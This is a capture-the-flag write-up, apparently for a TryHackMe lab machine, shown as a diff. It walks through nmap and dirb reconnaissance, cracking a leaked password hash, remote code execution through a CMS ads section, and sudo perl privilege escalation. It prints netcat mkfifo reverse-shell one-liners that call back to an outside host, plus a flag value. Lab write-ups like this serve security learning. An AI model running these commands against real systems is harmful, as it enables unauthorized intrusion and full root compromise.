@@ -1,0 +1,125 @@
+1) Reconnaisance
+	tool : nmap
+	command : sudo nmap -A -T5 $IP
+output
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 10:37 IST
+Nmap scan report for 10.10.181.218
+Host is up (0.20s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
+|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 256/tcp)
+HOP RTT       ADDRESS
+1   208.52 ms 10.8.0.1
+2   208.75 ms 10.10.181.218
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 53.20 seconds
+
+It's a normal apache page
+2) Web exploration
+ tool : dirb
+ command : dirb http://$IP
+==> DIRECTORY: http://10.10.181.218/content/         
+It's a sweetrice notice
+Nothing here 
+Let's try to explore content 
+command : dirb http://$IP/content
+==> DIRECTORY: http://10.10.181.218/content/_themes/                                                
+==> DIRECTORY: http://10.10.181.218/content/as/                                                     
+==> DIRECTORY: http://10.10.181.218/content/attachment/  
+login page at /content/as 
+==> DIRECTORY: http://10.10.181.218/content/inc/ 
+
+There is a mysqlbackup let's explore that
+42f749ade7f9e195bf475f37a44cafcb : password hash in the backup
+
+3)
+Crack the password
+Site : crackstation.net
+42f749ade7f9e195bf475f37a44cafcb : Password123
+This was manager's password successfully logged into website
+
+4)Gaining shell access 
+In ads section of website there is a code section maybe it'a  a remote code execution in this case
+We'll try to run reverse shell on it
+Starting our netcat listener
+nc -lnvp 1234 (any port you can listen in my case i am listeneing on 1234)
+listening on [any] 1234 ...
+connect to [10.8.131.147] from (UNKNOWN) [10.10.181.218] 42848
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 08:52:19 up 46 min,  0 users,  load average: 0.00, 0.00, 0.09
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+Gained access successfully
+
+4)Privelige escalation
+
+Beginning with shell spawining
+python -c 'import pty;pty.spawn("/bin/bash");'
+www-data@THM-Chal:/
+Finding user flag
+THM{63e5bce9271952aad1113b6f1ac28a07}
+For gaining root access
+* www-data@THM-Chal:/home/itguy$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+we can do some operation with perl
+content of copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+content of pl file
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+Two files are linked Writing  reverse shell in sh and connecting it to pl might help 
+
+
+www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.131.147 1236 >/tmp/f" >/etc/copy.sh    
+< -i 2>&1|nc 10.8.131.147 1236 >/tmp/f" >/etc/copy.sh                        
+www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
+cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.131.147 1236 >/tmp/f
+www-data@THM-Chal:/home/itguy$ 
+
+Running copy.sh
+listening now on nc -lnvp 1236
+listening on [any] 1236 ...
+
+now running command 
+www-data@THM-Chal:/etc$ sudo perl /home/itguy/backup.pl
+Output
+──(kali㉿kali)-[~]
+└─$ nc -lnvp 1236
+listening on [any] 1236 ...
+connect to [10.8.131.147] from (UNKNOWN) [10.10.181.218] 53274
+# whoami
+root
+# cd /root
+# ls
+root.txt
+# cat root.txt
+root@THM-Chal:~# 
+<And here our machine is solved !!!!>
